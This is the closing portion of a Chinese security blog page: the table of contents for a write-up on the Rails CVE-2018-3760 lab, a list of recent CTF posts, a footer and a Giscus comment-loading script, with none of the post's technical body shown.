class="toc-text">vulfocus&#x2F;rails-cve_2018_3760漏洞详解+源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 漏洞介绍：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 知识点：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.二次编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3RoR%EF%BC%88ruby-on-rails%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.简单了解RoR（ruby on rails）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%A1%BA%E4%BE%BF%E4%BA%86%E8%A7%A3Sprockets"><span class="toc-number">1.2.3.</span> <span class="toc-text">3.顺便了解Sprockets</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-exp"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/ctf%E9%A2%98%E8%A7%A3/web/NewStarCTF2025-Week4-Web-ssti%E5%9C%A8%E5%93%AA%E9%87%8C%EF%BC%9F-ssrf%E4%B8%8Essti%E6%B3%A8%E5%85%A5.html" title="NewStarCTF2025-Week4-Web-ssti在哪里？-ssrf与ssti注入">NewStarCTF2025-Week4-Web-ssti在哪里？-ssrf与ssti注入</a><time datetime="2026-05-27T01:00:00.000Z" title="发表于 2026-05-27 09:00:00">2026-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/ctf%E9%A2%98%E8%A7%A3/misc/BUUCTF%20MISC%20%E4%B9%9D%E8%BF%9E%E7%8E%AF.html" title="BUUCTF MISC 九连环">BUUCTF MISC 九连环</a><time datetime="2026-05-14T14:25:33.000Z" title="发表于 2026-05-14 22:25:33">2026-05-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/ctf%E9%A2%98%E8%A7%A3/misc/BUUCTF%20MISC%20%E7%A5%9E%E7%A7%98%E9%BE%99%E5%8D%B7%E9%A3%8E%201.html" title="BUUCTF MISC 神秘龙卷风 1">BUUCTF MISC 神秘龙卷风 1</a><time datetime="2026-05-14T14:25:33.000Z" title="发表于 2026-05-14 22:25:33">2026-05-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/ctf%E9%A2%98%E8%A7%A3/misc/BUUCTF%20MISC%20%E5%B0%8F%E6%98%8E%E7%9A%84%E4%BF%9D%E9%99%A9%E7%AE%B1%201.html" title="BUUCTF MISC 小明的保险箱 1">BUUCTF MISC 小明的保险箱 1</a><time datetime="2026-05-14T14:25:33.000Z" title="发表于 2026-05-14 22:25:33">2026-05-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/ctf%E9%A2%98%E8%A7%A3/web/vulfocusspring-core-rceSpring%20Framework%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E6%BC%8F%E6%B4%9E%E7%AE%80%E6%98%93%E8%A7%A3%E6%9E%90+%E9%9D%B6%E5%9C%BA%E4%BD%BF%E7%94%A8%E5%BB%BA%E8%AE%AE.html" title="vulfocusspring-core-rceSpring Framework 远程命令执行漏洞-漏洞简易解析+靶场使用建议">vulfocusspring-core-rceSpring Framework 远程命令执行漏洞-漏洞简易解析+靶场使用建议</a><time datetime="2026-05-14T14:24:22.000Z" title="发表于 2026-05-14 22:24:22">2026-05-14</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By qyt</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': '2829750658t-svg/2829750658t-svg.github.io',
+      'data-repo-id': 'R_kgDOQS61dQ',
+      'data-category-id': 'DIC_kwDOQS61dc4C1UR-',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
